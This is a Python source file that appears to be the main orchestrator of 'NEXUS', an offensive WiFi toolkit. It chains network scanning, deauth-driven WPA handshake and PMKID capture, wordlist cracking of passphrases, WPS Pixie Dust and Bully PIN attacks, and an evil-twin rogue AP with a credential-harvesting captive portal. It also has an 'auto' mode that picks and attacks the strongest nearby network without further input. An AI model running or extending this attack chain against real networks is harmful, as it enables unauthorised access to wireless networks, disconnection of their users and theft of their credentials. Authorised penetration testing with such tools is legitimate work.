#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  NEXUS — WiFi Security Testing Toolkit Orchestrator         ║
║  Full-chain: scan → capture → crack → exploit               ║
╚══════════════════════════════════════════════════════════════╝

WORKFLOWS:
  1. scan-only       Discover networks and clients
  2. handshake       Target AP → capture WPA handshake → export for cracking
  3. crack           Crack captured handshake with wordlist
  4. full            Scan → select target → capture → crack
  5. wps             WPS PIN attack (Pixie Dust / brute force)
  6. evil-twin       Rogue AP + captive portal credential harvest
  7. auto            Full automated: scan → pick strongest → attack all ways
"""

from __future__ import annotations

import sys
import time
import json
import argparse
import subprocess
from pathlib import Path
from dataclasses import dataclass, field
from typing import Optional

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.prompt import Prompt, Confirm
from rich.text import Text

from monitor import InterfaceManager, WirelessInterface
from sniffer import NetworkScanner, AccessPoint
from handshake import HandshakeCapturer, HandshakeCapture
from cracker import WPACracker, CrackTarget, _parse_hashcat_line
from wps_attack import WPSAttack, WPSResult
from evil_twin import EvilTwin, CaptivePortalHandler

console = Console()


@dataclass
class CampaignResult:
    ssid: str
    bssid: str
    channel: int
    encryption: str
    handshake_captured: bool = False
    pmkid_captured: bool = False
    passphrase: str | None = None
    wps_pin: str | None = None
    wps_password: str | None = None
    method_used: str = ""
    elapsed_total: float = 0.0


class NexusOrchestrator:
    """Orchestrates the full WiFi pentest workflow."""

    OUTPUT_DIR = Path("nexus_output")

    def __init__(self):
        self.scanner: NetworkScanner | None = None
        self.capturer: HandshakeCapturer | None = None
        self.results: list[CampaignResult] = []
        self._interface: str | None = None
        self._mon_interface: str | None = None

    def banner(self) -> None:
        banner_text = Text()
        banner_text.append("╔" + "═" * 58 + "╗\n", style="bold cyan")
        banner_text.append("║", style="bold cyan")
        banner_text.append("  NEXUS — WiFi Security Testing Toolkit", style="bold yellow")
        banner_text.append(" " * 15 + "║\n", style="bold cyan")
        banner_text.append("║", style="bold cyan")
        banner_text.append("  scan → capture → crack → exploit", style="dim white")
        banner_text.append(" " * 26 + "║\n", style="bold cyan")
        banner_text.append("╚" + "═" * 58 + "╝", style="bold cyan")
        console.print(banner_text)
        console.print()

    def _select_interface(self) -> str:
        """Enumerate and let user pick a wireless interface."""
        InterfaceManager.require_root()

        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      transient=True) as progress:
            progress.add_task("[cyan]Enumerating wireless interfaces...", total=None)
            ifaces = InterfaceManager.enumerate()

        if not ifaces:
            console.print("[red]No wireless interfaces found![/red]")
            console.print("[yellow]Plug in a compatible adapter and retry.[/yellow]")
            sys.exit(1)

        table = Table(title="Wireless Interfaces", border_style="cyan")
        table.add_column("#", style="dim")
        table.add_column("Interface", style="green")
        table.add_column("MAC", style="dim")
        table.add_column("Chipset", style="white")
        table.add_column("2.4GHz Ch", style="yellow")
        table.add_column("5GHz Ch", style="yellow")
        table.add_column("Injection", style="red")

        for i, iface in enumerate(ifaces, 1):
            table.add_row(
                str(i),
                iface.name,
                iface.mac,
                iface.chipset or iface.driver or "Unknown",
                str(len(iface.channels_2ghz)),
                str(len(iface.channels_5ghz)),
                "✓" if iface.supports_injection else "✗",
            )

        console.print(table)

        if len(ifaces) == 1:
            choice = "1"
        else:
            choice = Prompt.ask(
                "\n[bold]Select interface[/bold]",
                choices=[str(i) for i in range(1, len(ifaces) + 1)],
                default="1",
            )

        idx = int(choice) - 1
        console.print(f"[green]Selected: {ifaces[idx].name}[/green]")
        return ifaces[idx].name

    def _enable_monitor(self, iface: str) -> str:
        """Enable monitor mode and return the monitor interface name."""
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      transient=True) as progress:
            progress.add_task("[cyan]Enabling monitor mode...", total=None)
            mon_iface = InterfaceManager.enable_monitor_mode(iface)

        console.print(f"[green]Monitor mode: {mon_iface}[/green]")
        return mon_iface

    def run_scan(self, duration: float = 30) -> dict[str, AccessPoint]:
        """Full network scan and display."""
        console.print(Panel("[bold cyan]PHASE 1: Network Reconnaissance[/bold cyan]"))

        scanner = NetworkScanner(self._mon_interface)
        scanner.start(duration=duration, channel_hop=True)

        if not scanner.aps:
            console.print("[yellow]No networks found. Check interface and range.[/yellow]")
            return {}

        scanner.display_results()

        # Save scan results
        self.OUTPUT_DIR.mkdir(exist_ok=True)
        timestamp = int(time.time())
        scan_file = self.OUTPUT_DIR / f"scan_{timestamp}.json"
        scanner.export_json(scan_file)
        console.print(f"\n[dim]Scan results saved: {scan_file}[/dim]")

        return scanner.aps

    def pick_target(self, aps: dict[str, AccessPoint]) -> AccessPoint | None:
        """Let user pick a target from scan results."""
        if not aps:
            return None

        sorted_aps = sorted(aps.values(), key=lambda a: (-a.rssi, -a.beacons))
        targets = [ap for ap in sorted_aps if ap.encryption_str not in ("Open", "Unknown")]

        table = Table(title="Potential Targets (non-Open networks)", border_style="cyan")
        table.add_column("#", style="dim")
        table.add_column("SSID", style="green")
        table.add_column("BSSID", style="white")
        table.add_column("CH", style="yellow")
        table.add_column("RSSI", style="red")
        table.add_column("Encryption", style="magenta")
        table.add_column("Clients", style="cyan")
        table.add_column("Vendor", style="dim")

        for i, ap in enumerate(targets[:20], 1):
            table.add_row(
                str(i), ap.ssid, ap.bssid, str(ap.channel),
                str(ap.rssi), ap.encryption_str,
                str(len(ap.clients)), ap.vendor,
            )

        console.print(table)

        choice = Prompt.ask(
            "\n[bold]Select target (#)[/bold] (or 'back' to scan again)",
            default="1",
        )
        if choice.lower() == "back":
            return None

        try:
            idx = int(choice) - 1
            if 0 <= idx < len(targets):
                return targets[idx]
        except ValueError:
            pass

        return None

    def run_handshake_capture(self, target: AccessPoint,
                               duration: int = 90) -> list[HandshakeCapture]:
        """Capture WPA handshake for a target."""
        console.print(Panel(f"[bold cyan]PHASE 2: Handshake Capture — {target.ssid}[/bold cyan]"))

        capturer = HandshakeCapturer(
            iface=self._mon_interface,
            target_bssid=target.bssid,
            target_channel=target.channel,
            ssid=target.ssid,
        )

        # Try PMKID first (fast, no deauth needed), then full handshake
        console.print("[cyan]Attempting PMKID capture (passive)...[/cyan]")
        captures = capturer.capture(duration=min(20, duration // 3), deauth=False,
                                     pmkid_mode=True)

        pmkid_found = any(c.pmkid for c in captures)

        if not pmkid_found:
            console.print("[cyan]No PMKID. Starting active deauth + handshake capture...[/cyan]")
            captures = capturer.capture(duration=duration, deauth=True)
        else:
            console.print("[green]PMKID captured! No deauth needed.[/green]")

        # Save output
        self.OUTPUT_DIR.mkdir(exist_ok=True)
        timestamp = int(time.time())
        safe_ssid = "".join(c for c in target.ssid if c.isalnum() or c in "_- ").strip()[:20]

        # Save hashcat format
        hc_file = self.OUTPUT_DIR / f"{safe_ssid}_{timestamp}.hc22000"
        count = capturer.save_hashcat(hc_file)
        if count > 0:
            console.print(f"[green]Hashcat file: {hc_file} ({count} hash(es))[/green]")

        return captures

    def run_crack(self, target: AccessPoint, hc_file: str, wordlist: str) -> str | None:
        """Crack captured handshake."""
        console.print(Panel(f"[bold cyan]PHASE 3: Cracking — {target.ssid}[/bold cyan]"))

        targets = []
        with open(hc_file, "r") as f:
            for line in f:
                t = _parse_hashcat_line(line)
                if t:
                    targets.append(t)

        if not targets:
            console.print("[red]No valid targets in hashcat file.[/red]")
            return None

        for t in targets:
            t.ssid = target.ssid or t.ssid
            if not t.ssid:
                t.ssid = target.ssid

        for crack_target in targets:
            if not crack_target.pmkid and not crack_target.mic:
                console.print(f"[yellow]Skipping {crack_target.bssid}: no PMKID or MIC[/yellow]")
                continue

            passphrase, elapsed = WPACracker.crack_wordlist(crack_target, wordlist)
            if passphrase:
                return passphrase

        return None

    def run_wps(self, target: AccessPoint) -> WPSResult | None:
        """Attempt WPS attack on target."""
        console.print(Panel(f"[bold cyan]PHASE 2b: WPS Attack — {target.ssid}[/bold cyan]"))

        if not WPSAttack.check_wps(self._mon_interface, target.bssid):
            console.print("[yellow]WPS not detected. Skipping.[/yellow]")
            return None

        console.print("[green]WPS detected! Attempting Pixie Dust...[/green]")
        return WPSAttack.pixie_dust(
            self._mon_interface, target.bssid, target.channel, ssid=target.ssid
        )

    def run_full_attack(self, wordlist: str | None = None) -> list[CampaignResult]:
        """The full automated attack chain."""
        results: list[CampaignResult] = []

        # Phase 1: Scan
        aps = self.run_scan(duration=30)
        if not aps:
            return results

        target = self.pick_target(aps)
        if not target:
            return results

        result = CampaignResult(
            ssid=target.ssid,
            bssid=target.bssid,
            channel=target.channel,
            encryption=target.encryption_str,
        )
        start_time = time.time()

        # Phase 2a: Try WPS first (fastest if it works)
        if "WPS" in target.encryption:
            wps_result = self.run_wps(target)
            if wps_result and wps_result.success:
                result.wps_pin = wps_result.pin
                result.wps_password = wps_result.password
                result.method_used = "wps"
                result.elapsed_total = time.time() - start_time
                results.append(result)
                return results

        # Phase 2b: Handshake capture
        captures = self.run_handshake_capture(target, duration=90)

        if any(c.pmkid for c in captures):
            result.pmkid_captured = True
        if any(c.complete for c in captures):
            result.handshake_captured = True

        if not result.pmkid_captured and not result.handshake_captured:
            console.print("[red]No handshake captured. Target may be out of range.[/red]")
            result.elapsed_total = time.time() - start_time
            results.append(result)
            return results

        # Phase 3: Crack
        if wordlist:
            # Find latest hashcat file
            hc_files = sorted(self.OUTPUT_DIR.glob("*.hc22000"),
                              key=lambda p: p.stat().st_mtime, reverse=True)
            if hc_files:
                passphrase = self.run_crack(target, str(hc_files[0]), wordlist)
                if passphrase:
                    result.passphrase = passphrase
                    result.method_used = "handshake+crack"
            else:
                console.print("[yellow]No hashcat file found. Export it first.[/yellow]")

        result.elapsed_total = time.time() - start_time
        results.append(result)
        return results

    def run_auto(self, wordlist: str | None = None) -> None:
        """Fully automated attack: scan, pick strongest, try everything."""
        console.print(Panel("[bold red]AUTO MODE — Attacking strongest target[/bold red]"))

        scanner = NetworkScanner(self._mon_interface)
        scanner.start(duration=20, channel_hop=True)

        if not scanner.aps:
            console.print("[red]No networks found.[/red]")
            return

        # Pick strongest WPA2 target with clients
        best = None
        for ap in sorted(scanner.aps.values(),
                         key=lambda a: (-a.rssi, -(len(a.clients)), -a.beacons)):
            if ap.encryption_str in ("WPA2", "WPA2/WPA", "WPA"):
                best = ap
                break
            elif ap.encryption_str == "Open" and not best:
                best = ap  # Fallback

        if not best:
            best = max(scanner.aps.values(), key=lambda a: a.rssi)

        console.print(f"\n[bold green]Auto-selected target:[/bold green]")
        console.print(f"  SSID: {best.ssid}")
        console.print(f"  BSSID: {best.bssid}")
        console.print(f"  Channel: {best.channel}")
        console.print(f"  Encryption: {best.encryption_str}")
        console.print(f"  Signal: {best.rssi} dBm")
        console.print(f"  Clients: {len(best.clients)}")

        result = CampaignResult(
            ssid=best.ssid, bssid=best.bssid,
            channel=best.channel, encryption=best.encryption_str,
        )
        start_time = time.time()

        # Try WPS
        wps_result = self.run_wps(best)
        if wps_result and wps_result.success:
            result.wps_pin = wps_result.pin
            result.wps_password = wps_result.password
            result.method_used = "wps"
            result.elapsed_total = time.time() - start_time
            self.results.append(result)
            self._print_summary()
            return

        # Capture handshake
        captures = self.run_handshake_capture(best, duration=120)

        if any(c.pmkid for c in captures):
            result.pmkid_captured = True
        if any(c.complete for c in captures):
            result.handshake_captured = True

        # Crack if wordlist provided
        if wordlist and (result.pmkid_captured or result.handshake_captured):
            hc_files = sorted(self.OUTPUT_DIR.glob("*.hc22000"),
                              key=lambda p: p.stat().st_mtime, reverse=True)
            if hc_files:
                passphrase = self.run_crack(best, str(hc_files[0]), wordlist)
                if passphrase:
                    result.passphrase = passphrase
                    result.method_used = "handshake+crack"

        result.elapsed_total = time.time() - start_time
        self.results.append(result)
        self._print_summary()

    def run_evil_twin(self, target: AccessPoint | None = None,
                      internet_iface: str | None = None) -> None:
        """Run evil twin attack with captive portal."""
        if target is None:
            aps = self.run_scan(duration=15)
            if not aps:
                return
            target = self.pick_target(aps)
            if not target:
                return

        console.print(Panel(f"[bold red]EVIL TWIN — {target.ssid}[/bold red]"))
        console.print("[yellow]This creates a fake AP. Only test on networks you own![/yellow]")

        if not Confirm.ask("[bold]Proceed with evil twin?[/bold]", default=False):
            return

        # We need a second interface for the evil twin AP
        # or we can re-use the same interface by stopping monitor mode
        console.print("[yellow]Evil twin requires an AP-capable interface.[/yellow]")
        console.print("[yellow]Use a second WiFi adapter for best results.[/yellow]")

        ap_iface = Prompt.ask("[bold]Interface for rogue AP[/bold]",
                               default=self._interface or "wlan0")

        # Stop monitor on the AP interface if it's in monitor mode
        try:
            InterfaceManager.disable_monitor_mode(ap_iface)
        except Exception:
            pass

        evil = EvilTwin(
            iface=ap_iface,
            ssid=target.ssid,
            channel=target.channel,
            internet_iface=internet_iface,
        )
        evil.start(deauth_original=True)
        evil.cleanup()

    def _print_summary(self) -> None:
        """Print final attack summary."""
        console.print()
        console.print(Panel("[bold green]ATTACK SUMMARY[/bold green]"))

        for r in self.results:
            table = Table(border_style="green")
            table.add_column("Field", style="dim")
            table.add_column("Value", style="white")
            table.add_row("SSID", r.ssid)
            table.add_row("BSSID", r.bssid)
            table.add_row("Channel", str(r.channel))
            table.add_row("Encryption", r.encryption)
            table.add_row("Method", r.method_used or "N/A")
            if r.wps_pin:
                table.add_row("WPS PIN", r.wps_pin)
            if r.wps_password:
                table.add_row("WPS Password", r.wps_password)
            if r.passphrase:
                table.add_row("Passphrase", f"[bold green]{r.passphrase}[/bold green]")
            table.add_row("Handshake", "✓" if r.handshake_captured else "✗")
            table.add_row("PMKID", "✓" if r.pmkid_captured else "✗")
            table.add_row("Elapsed", f"{r.elapsed_total:.1f}s")
            console.print(table)
            console.print()

    def cleanup(self) -> None:
        """Restore interfaces to managed mode."""
        if self._mon_interface:
            try:
                console.print("[dim]Restoring managed mode...[/dim]")
                InterfaceManager.disable_monitor_mode(self._mon_interface)
            except Exception:
                pass


def main():
    parser = argparse.ArgumentParser(
        description="NEXUS — WiFi Security Testing Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  python nexus.py scan                          # Scan for networks
  python nexus.py capture <BSSID> -c 6          # Capture handshake
  python nexus.py crack -w wordlist.txt -s SSID --bssid AA:BB:CC:DD:EE:FF
  python nexus.py full -w wordlist.txt          # Full attack chain
  python nexus.py auto -w wordlist.txt          # Automatic attack
  python nexus.py wps <BSSID> -c 6              # WPS attack
  python nexus.py evil-twin <SSID> -c 6         # Evil twin attack
        """,
    )

    sub = parser.add_subparsers(dest="command", help="Attack mode")

    # scan
    scan_p = sub.add_parser("scan", help="Discover networks and clients")
    scan_p.add_argument("-t", "--time", type=float, default=30,
                        help="Scan duration in seconds")

    # capture
    cap_p = sub.add_parser("capture", help="Capture WPA handshake")
    cap_p.add_argument("bssid", help="Target BSSID")
    cap_p.add_argument("-c", "--channel", type=int, required=True)
    cap_p.add_argument("-s", "--ssid", default="")
    cap_p.add_argument("-t", "--time", type=int, default=60)
    cap_p.add_argument("--pmkid", action="store_true")

    # crack
    crack_p = sub.add_parser("crack", help="Crack captured handshake")
    crack_p.add_argument("-w", "--wordlist", required=True)
    crack_p.add_argument("--hashcat", type=str)
    crack_p.add_argument("-s", "--ssid")
    crack_p.add_argument("--bssid")
    crack_p.add_argument("--station")
    crack_p.add_argument("--pmkid", type=str)
    crack_p.add_argument("--mic", type=str)
    crack_p.add_argument("--anonce", type=str)
    crack_p.add_argument("--snonce", type=str)
    crack_p.add_argument("-j", "--jobs", type=int)

    # full
    full_p = sub.add_parser("full", help="Full attack chain")
    full_p.add_argument("-w", "--wordlist")
    full_p.add_argument("-t", "--time", type=float, default=30,
                        help="Scan duration")

    # auto
    auto_p = sub.add_parser("auto", help="Automatic attack")
    auto_p.add_argument("-w", "--wordlist")
    auto_p.add_argument("-t", "--time", type=float, default=20,
                        help="Scan duration")

    # wps
    wps_p = sub.add_parser("wps", help="WPS PIN attack")
    wps_p.add_argument("bssid")
    wps_p.add_argument("-c", "--channel", type=int, required=True)
    wps_p.add_argument("-s", "--ssid", default="")
    wps_p.add_argument("-p", "--pin")
    wps_p.add_argument("--bully", action="store_true")

    # evil-twin
    et_p = sub.add_parser("evil-twin", help="Evil twin / rogue AP")
    et_p.add_argument("ssid", nargs="?", default=None)
    et_p.add_argument("-c", "--channel", type=int, default=6)
    et_p.add_argument("-i", "--internet", help="Internet-connected interface")

    args = parser.parse_args()

    nexus = NexusOrchestrator()

    try:
        nexus.banner()

        if not args.command:
            console.print("[yellow]No command specified. Use --help for options.[/yellow]")
            console.print("[yellow]Quick start: python nexus.py scan[/yellow]")
            return

        # For commands that need an interface
        if args.command in ("scan", "capture", "wps", "full", "auto"):
            nexus._interface = nexus._select_interface()
            nexus._mon_interface = nexus._enable_monitor(nexus._interface)

        if args.command == "scan":
            nexus.run_scan(duration=args.time)

        elif args.command == "capture":
            capturer = HandshakeCapturer(
                iface=nexus._mon_interface,
                target_bssid=args.bssid,
                target_channel=args.channel,
                ssid=args.ssid,
            )
            captures = capturer.capture(duration=args.time, deauth=not args.pmkid,
                                        pmkid_mode=args.pmkid)
            if captures:
                timestamp = int(time.time())
                safe_ssid = "".join(c for c in (args.ssid or "capture")
                                    if c.isalnum() or c in "_- ")[:20]
                hc_file = nexus.OUTPUT_DIR / f"{safe_ssid}_{timestamp}.hc22000"
                nexus.OUTPUT_DIR.mkdir(exist_ok=True)
                capturer.save_hashcat(hc_file)

        elif args.command == "crack":
            if args.hashcat:
                with open(args.hashcat, "r") as f:
                    for line in f:
                        target = _parse_hashcat_line(line)
                        if target:
                            passphrase, elapsed = WPACracker.crack_wordlist(
                                target, args.wordlist, workers=args.jobs
                            )
                            if passphrase:
                                console.print(f"\n[bold green]PASSWORD: {passphrase}[/bold green]")
                            return
            elif args.ssid:
                target = CrackTarget(
                    ssid=args.ssid,
                    bssid=args.bssid or "",
                    station=args.station or "",
                    pmkid=bytes.fromhex(args.pmkid) if args.pmkid else None,
                    mic=bytes.fromhex(args.mic) if args.mic else b"",
                    anonce=bytes.fromhex(args.anonce) if args.anonce else b"",
                    snonce=bytes.fromhex(args.snonce) if args.snonce else b"",
                )
                passphrase, elapsed = WPACracker.crack_wordlist(
                    target, args.wordlist, workers=args.jobs
                )
                if passphrase:
                    console.print(f"\n[bold green]PASSWORD: {passphrase}[/bold green]")
            else:
                console.print("[red]Provide --hashcat file or --ssid + parameters[/red]")

        elif args.command == "wps":
            result = WPSAttack.pixie_dust(
                nexus._mon_interface, args.bssid, args.channel,
                ssid=args.ssid, pin=args.pin,
            )
            if not result.success:
                console.print("[yellow]Pixie Dust failed, trying Bully...[/yellow]")
                result = WPSAttack.bully_attack(
                    nexus._mon_interface, args.bssid, args.channel,
                    ssid=args.ssid, pin=args.pin,
                )

        elif args.command == "evil-twin":
            if args.ssid:
                # Direct mode — need scan for channel info
                target = AccessPoint(bssid="unknown", ssid=args.ssid,
                                     channel=args.channel)
                nexus.run_evil_twin(target, internet_iface=args.internet)
            else:
                nexus.run_evil_twin(internet_iface=args.internet)

        elif args.command == "full":
            nexus.run_full_attack(wordlist=args.wordlist)

        elif args.command == "auto":
            nexus.run_auto(wordlist=args.wordlist)

    except KeyboardInterrupt:
        console.print("\n[yellow]Interrupted by user.[/yellow]")
    finally:
        nexus.cleanup()


if __name__ == "__main__":
    main()
